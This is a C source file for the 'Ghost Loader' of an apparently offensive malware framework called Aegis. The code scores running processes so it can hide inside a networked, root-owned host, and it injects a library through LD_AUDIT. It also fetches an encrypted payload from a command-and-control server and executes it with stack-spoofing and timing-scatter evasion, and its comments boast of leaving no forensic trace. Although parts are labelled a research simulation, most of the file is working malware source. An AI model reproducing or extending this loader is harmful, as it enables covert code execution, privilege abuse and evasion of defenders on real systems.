/*
 * ============================================================================
 *  AEGIS FRAMEWORK — Ghost Loader (In-Memory Core)
 * ============================================================================
 *  Classification : PRIVATE — LO/ENI EYES ONLY
 *  Component      : ghost_loader/ghost_loader.c
 *  Purpose        : The Ghost Loader is the in-memory core of Aegis.
 *                   It lives exclusively in RAM, never touches disk.
 *                   Delivered by the Stager via memfd_create, its mission:
 *
 *                   1. Select a host process for parasitization
 *                   2. Inject itself into the host via the Catalyst
 *                   3. Fetch the encrypted payload from C2
 *                   4. Initialize the Payload Vault and Nanomachine
 *                   5. Begin payload execution through the Nanomachine
 *
 *  Process Selection:
 *                   The Ghost Loader scores candidate host processes based on:
 *                   - Network activity (+30: masks our C2 traffic)
 *                   - Longevity (+25: won't exit unexpectedly)
 *                   - Memory footprint (+20: our allocation hides in noise)
 *                   - Root privilege (+15: gives us more capabilities)
 *                   - Multi-threaded (+10: our phantom threads blend in)
 *
 *  Architecture   : This file is compiled as a standalone ELF binary.
 *                   It is  meant to be executed via memfd/fexecve.
 * ============================================================================
 */

#include "../c2_comms/c2_client.h"
#include "../c2_comms/crypto.h"
#include "../common/config.h"
#include "../common/logging.h"
#include "../common/types.h"
#include "../nanomachine/opcodes.h"
#include "../nanomachine/vault.h"


#include <dirent.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/sysinfo.h>
#include <time.h>
#include <unistd.h>


/* Forward declaration from nanomachine.c */
extern aegis_result_t aegis_nanomachine_run(aegis_vault_ctx_t *vault,
                                            aegis_log_ctx_t *log,
                                            aegis_crypto_ctx_t *crypto,
                                            const uint8_t *instruction_stream,
                                            size_t stream_len);

/* ── Internal: Read a /proc file into buffer ─────────────────────────────── */

static ssize_t read_proc_file(const char *path, char *buf, size_t cap) {
  int fd = open(path, O_RDONLY);
  if (fd < 0)
    return -1;
  ssize_t n = read(fd, buf, cap - 1);
  close(fd);
  if (n > 0)
    buf[n] = '\0';
  return n;
}

/* ── Process Scoring & Selection ─────────────────────────────────────────── */

static bool is_candidate(const char *comm) {
  char candidates[512];
  strncpy(candidates, AEGIS_HOST_CANDIDATES, sizeof(candidates) - 1);
  candidates[sizeof(candidates) - 1] = '\0';

  char *saveptr;
  char *tok = strtok_r(candidates, ",", &saveptr);
  while (tok) {
    if (strcmp(comm, tok) == 0)
      return true;
    tok = strtok_r(NULL, ",", &saveptr);
  }
  return false;
}

static uint32_t score_process(pid_t pid, const char *comm,
                              aegis_log_ctx_t *log) {
  uint32_t score = 0;
  char path[256], buf[4096];

  /* Check network activity: does this process have open sockets? */
  snprintf(path, sizeof(path), "/proc/%d/net/tcp", pid);
  if (read_proc_file(path, buf, sizeof(buf)) > 0) {
    /* Count lines (header + connections) */
    int lines = 0;
    for (char *p = buf; *p; p++)
      if (*p == '\n')
        lines++;
    if (lines > 1)
      score += 30; /* Has active network connections */
  }

  /* Check uptime: how long has this process been running? */
  snprintf(path, sizeof(path), "/proc/%d/stat", pid);
  if (read_proc_file(path, buf, sizeof(buf)) > 0) {
    /* Field 22 = start time in clock ticks */
    unsigned long start_time = 0;
    char *p = buf;
    int field = 0;
    /* Skip past the comm field (in parentheses) */
    char *comm_end = strrchr(p, ')');
    if (comm_end) {
      p = comm_end + 2;
      field = 3; /* Now at field 3 (state) */
      while (*p && field < 22) {
        if (*p == ' ')
          field++;
        p++;
      }
      sscanf(p, "%lu", &start_time);

      struct sysinfo si;
      if (sysinfo(&si) == 0) {
        long ticks = sysconf(_SC_CLK_TCK);
        if (ticks > 0) {
          unsigned long proc_uptime =
              si.uptime - (start_time / (unsigned long)ticks);
          if (proc_uptime > AEGIS_HOST_MIN_UPTIME_SEC)
            score += 25; /* Long-lived process */
        }
      }
    }
  }

  /* Check memory footprint */
  snprintf(path, sizeof(path), "/proc/%d/status", pid);
  if (read_proc_file(path, buf, sizeof(buf)) > 0) {
    const char *rss = strstr(buf, "VmRSS:");
    if (rss) {
      unsigned long rss_kb = 0;
      sscanf(rss, "VmRSS:\t%lu", &rss_kb);
      if (rss_kb >= AEGIS_HOST_MIN_RSS_KB)
        score += 20; /* Significant memory footprint */
    }

    /* Check thread count */
    const char *threads = strstr(buf, "Threads:");
    if (threads) {
      int n_threads = 0;
      sscanf(threads, "Threads:\t%d", &n_threads);
      if (n_threads > 1)
        score += 10; /* Multi-threaded */
    }
  }

  /* Check if root-owned */
  snprintf(path, sizeof(path), "/proc/%d/status", pid);
  if (read_proc_file(path, buf, sizeof(buf)) > 0) {
    const char *uid = strstr(buf, "Uid:");
    if (uid) {
      int real_uid = -1;
      sscanf(uid, "Uid:\t%d", &real_uid);
      if (real_uid == 0)
        score += 15; /* Root-owned */
    }
  }

  aegis_log_event(log, LOG_CAT_GHOST, LOG_SEV_TRACE,
                  "Process scored: pid=%d comm=%s score=%u", pid, comm, score);

  return score;
}

static aegis_result_t select_host_process(aegis_proc_score_t *best,
                                          aegis_log_ctx_t *log) {
  DIR *proc = opendir("/proc");
  if (!proc)
    return AEGIS_ERR_GENERIC;

  memset(best, 0, sizeof(*best));

  struct dirent *entry;
  while ((entry = readdir(proc)) != NULL) {
    if (entry->d_name[0] < '0' || entry->d_name[0] > '9')
      continue;

    pid_t pid = (pid_t)atoi(entry->d_name);
    if (pid == getpid() || pid <= 1)
      continue; /* Skip ourselves and init */

    char comm_path[128], comm[256] = {0};
    snprintf(comm_path, sizeof(comm_path), "/proc/%d/comm", (int)pid);
    if (read_proc_file(comm_path, comm, sizeof(comm)) < 0)
      continue;

    char *nl = strchr(comm, '\n');
    if (nl)
      *nl = '\0';

    /* Only consider known candidate processes */
    if (!is_candidate(comm))
      continue;

    uint32_t score = score_process(pid, comm, log);

    if (score > best->score) {
      best->pid = pid;
      snprintf(best->comm, sizeof(best->comm), "%s", comm);
      best->score = score;
    }
  }

  closedir(proc);

  if (best->score == 0)
    return AEGIS_ERR_GENERIC; /* No suitable host found */

  aegis_log_event(log, LOG_CAT_GHOST, LOG_SEV_INFO,
                  "Selected host process: pid=%d comm=%s score=%u", best->pid,
                  best->comm, best->score);

  return AEGIS_OK;
}

/* ── Internal: Deploy Catalyst ───────────────────────────────────────────── */

static aegis_result_t deploy_catalyst(aegis_log_ctx_t *log) {
  /*
   * The Catalyst (catalyst.c) is typically embedded in the Ghost Loader
   * and executed to:
   *   1. Drop nexus_auditor.so
   *   2. Set LD_AUDIT
   *   3. Self-destruct
   *
   * For the research framework, we simulate this by directly
   * setting the environment and creating the necessary files.
   *
   * In production, the Catalyst binary would be embedded as a
   * byte array and executed via memfd_create.
   */
  const char *home = getenv("HOME");
  if (!home)
    return AEGIS_ERR_GENERIC;

  aegis_log_event(log, LOG_CAT_GHOST, LOG_SEV_INFO,
                  "Deploying Environment Catalyst...");

  /* Check if LD_AUDIT is already set (catalyst already ran) */
  const char *ld_audit = getenv(AEGIS_AUDIT_ENV_VAR);
  if (ld_audit && strstr(ld_audit, AEGIS_AUDITOR_FILENAME)) {
    aegis_log_event(log, LOG_CAT_GHOST, LOG_SEV_INFO,
                    "LD_AUDIT already configured — "
                    "Catalyst not needed");
    return AEGIS_OK;
  }

  char auditor_path[512];
  snprintf(auditor_path, sizeof(auditor_path), "%s/%s%s", home,
           AEGIS_AUDITOR_REL_PATH, AEGIS_AUDITOR_FILENAME);

  /* Verify the auditor .so exists */
  if (access(auditor_path, F_OK) != 0) {
    aegis_log_event(log, LOG_CAT_GHOST, LOG_SEV_WARN,
                    "Auditor not found at %s — "
                    "needs full catalyst deployment",
                    auditor_path);
    /*
     * In production: extract embedded catalyst, write to memfd,
     * execute via fexecve.  The catalyst handles everything.
     */
    return AEGIS_ERR_INJECTION;
  }

  /* Set LD_AUDIT for this session */
  setenv(AEGIS_AUDIT_ENV_VAR, auditor_path, 1);

  aegis_log_event(log, LOG_CAT_GHOST, LOG_SEV_INFO,
                  "Catalyst deployment complete: LD_AUDIT=%s", auditor_path);

  return AEGIS_OK;
}

/* ── Main Entry Point ────────────────────────────────────────────────────── */

int main(int argc, char *argv[]) {
  (void)argc;
  (void)argv;

  const char *home = getenv("HOME");
  if (!home)
    return 0;

  /* ═══ PHASE 1: INITIALIZE LOGGING ═══ */

  char log_path[512];
  snprintf(log_path, sizeof(log_path), "%s/%s", home, AEGIS_LOG_REL_PATH);
  aegis_log_ctx_t *log = aegis_log_init(log_path, 0);

  aegis_log_event(log, LOG_CAT_GHOST, LOG_SEV_INFO,
                  "=== Ghost Loader initiated (pid=%d) ===", (int)getpid());

  /* ═══ PHASE 2: INITIALIZE CRYPTO & C2 ═══ */

  aegis_crypto_ctx_t crypto;
  aegis_result_t rc = aegis_crypto_init(&crypto, NULL);
  if (rc != AEGIS_OK) {
    aegis_log_event(log, LOG_CAT_GHOST, LOG_SEV_CRITICAL,
                    "Crypto init failed (rc=%d)", rc);
    aegis_log_finalize(log);
    return 0;
  }

  aegis_c2_ctx_t c2;
  rc = aegis_c2_init(&c2, &crypto);
  if (rc != AEGIS_OK) {
    aegis_log_event(log, LOG_CAT_GHOST, LOG_SEV_CRITICAL,
                    "C2 init failed (rc=%d)", rc);
    aegis_crypto_destroy(&crypto);
    aegis_log_finalize(log);
    return 0;
  }

  /* ═══ PHASE 3: SELECT HOST PROCESS ═══ */

  aegis_proc_score_t host;
  rc = select_host_process(&host, log);
  if (rc != AEGIS_OK) {
    aegis_log_event(log, LOG_CAT_GHOST, LOG_SEV_WARN,
                    "No suitable host process found — "
                    "running standalone");
  } else {
    aegis_log_event(log, LOG_CAT_GHOST, LOG_SEV_INFO,
                    "Host process selected: pid=%d (%s) score=%u", host.pid,
                    host.comm, host.score);
  }

  /* ═══ PHASE 4: DEPLOY CATALYST (LD_AUDIT INJECTION) ═══ */

  rc = deploy_catalyst(log);
  if (rc != AEGIS_OK) {
    aegis_log_event(log, LOG_CAT_GHOST, LOG_SEV_WARN,
                    "Catalyst deployment issue (rc=%d) — "
                    "continuing with limited capability",
                    rc);
  }

  /* ═══ PHASE 5: FETCH ENCRYPTED PAYLOAD FROM C2 ═══ */

  uint8_t *payload_data = NULL;
  size_t payload_len = 0;

  rc = aegis_c2_fetch_payload(&c2, &payload_data, &payload_len);
  if (rc != AEGIS_OK || !payload_data) {
    aegis_log_event(log, LOG_CAT_GHOST, LOG_SEV_ERROR,
                    "Payload fetch failed (rc=%d)", rc);
    aegis_c2_destroy(&c2);
    aegis_crypto_destroy(&crypto);
    aegis_log_finalize(log);
    return 0;
  }

  aegis_log_event(log, LOG_CAT_GHOST, LOG_SEV_INFO,
                  "Payload received from C2: %zu bytes (encrypted)",
                  payload_len);

  /* ═══ PHASE 6: INITIALIZE PAYLOAD VAULT ═══ */

  aegis_vault_ctx_t vault;
  rc = aegis_vault_init(&vault, payload_data, payload_len, 0, &crypto, log);

  /* The raw payload buffer is no longer needed — the vault has a copy */
  AEGIS_WIPE(payload_data, payload_len, 1);
  free(payload_data);
  payload_data = NULL;

  if (rc != AEGIS_OK) {
    aegis_log_event(log, LOG_CAT_GHOST, LOG_SEV_CRITICAL,
                    "Vault initialization failed (rc=%d)", rc);
    aegis_c2_destroy(&c2);
    aegis_crypto_destroy(&crypto);
    aegis_log_finalize(log);
    return 0;
  }

  aegis_log_event(log, LOG_CAT_GHOST, LOG_SEV_INFO,
                  "Payload Vault initialized: %u chunks, %zu bytes",
                  aegis_vault_chunk_count(&vault),
                  aegis_vault_total_size(&vault));

  /* ═══ PHASE 7: START NANOMACHINE EXECUTION ═══ */

  aegis_log_event(log, LOG_CAT_GHOST, LOG_SEV_INFO,
                  "=== Transferring control to Nanomachine ===");

  /*
   * In production, the instruction stream would be fetched from
   * C2 separately or embedded in the payload metadata.
   *
   * For the research framework, we construct a minimal instruction
   * stream that demonstrates the Nanomachine's capabilities.
   */

  /* Build a demo instruction stream */
  uint8_t demo_stream[128];
  size_t demo_len = 0;

  /* Instruction 1: Enable temporal scattering */
  aegis_instruction_t *instr = (aegis_instruction_t *)demo_stream;
  instr->opcode = OP_SCATTER_ON;
  instr->flags = OP_FLAG_NONE;
  instr->operand_len = 0;
  demo_len += sizeof(aegis_instruction_t);

  /* Instruction 2: Enable stack spoofing */
  instr = (aegis_instruction_t *)(demo_stream + demo_len);
  instr->opcode = OP_SPOOF_STACK;
  instr->flags = OP_FLAG_NONE;
  instr->operand_len = 0;
  demo_len += sizeof(aegis_instruction_t);

  /* Instruction 3: Execute chunk 0 from the vault */
  instr = (aegis_instruction_t *)(demo_stream + demo_len);
  instr->opcode = OP_EXEC_CHUNK;
  instr->flags = OP_FLAG_CRITICAL;
  instr->operand_len = sizeof(uint32_t);
  demo_len += sizeof(aegis_instruction_t);
  *(uint32_t *)(demo_stream + demo_len) = 0; /* Chunk ID 0 */
  demo_len += sizeof(uint32_t);

  /* Instruction 4: Log a checkpoint */
  instr = (aegis_instruction_t *)(demo_stream + demo_len);
  instr->opcode = OP_CHECKPOINT;
  instr->flags = OP_FLAG_NONE;
  instr->operand_len = 0;
  demo_len += sizeof(aegis_instruction_t);

  /* Instruction 5: Halt */
  instr = (aegis_instruction_t *)(demo_stream + demo_len);
  instr->opcode = OP_HALT;
  instr->flags = OP_FLAG_LAST;
  instr->operand_len = 0;
  demo_len += sizeof(aegis_instruction_t);

  /* Run the Nanomachine */
  rc = aegis_nanomachine_run(&vault, log, &crypto, demo_stream, demo_len);

  aegis_log_event(log, LOG_CAT_GHOST, LOG_SEV_INFO,
                  "Nanomachine returned (rc=%d)", rc);

  /* ═══ PHASE 8: CLEANUP ═══ */

  aegis_log_event(log, LOG_CAT_GHOST, LOG_SEV_INFO,
                  "=== Ghost Loader mission complete — "
                  "dissolving into nothingness ===");

  aegis_vault_destroy(&vault);
  aegis_c2_destroy(&c2);
  aegis_crypto_destroy(&crypto);
  aegis_log_finalize(log);

  /*
   * When this process exits, the entire injected framework dissolves.
   * There is no binary on disk. No forensic trace remains.
   * The Ghost Loader, Nanomachine, and Payload Vault exist only
   * in the address space of a terminated process.
   *
   * The operation dissolves into nothingness.
   */

  return 0;
}
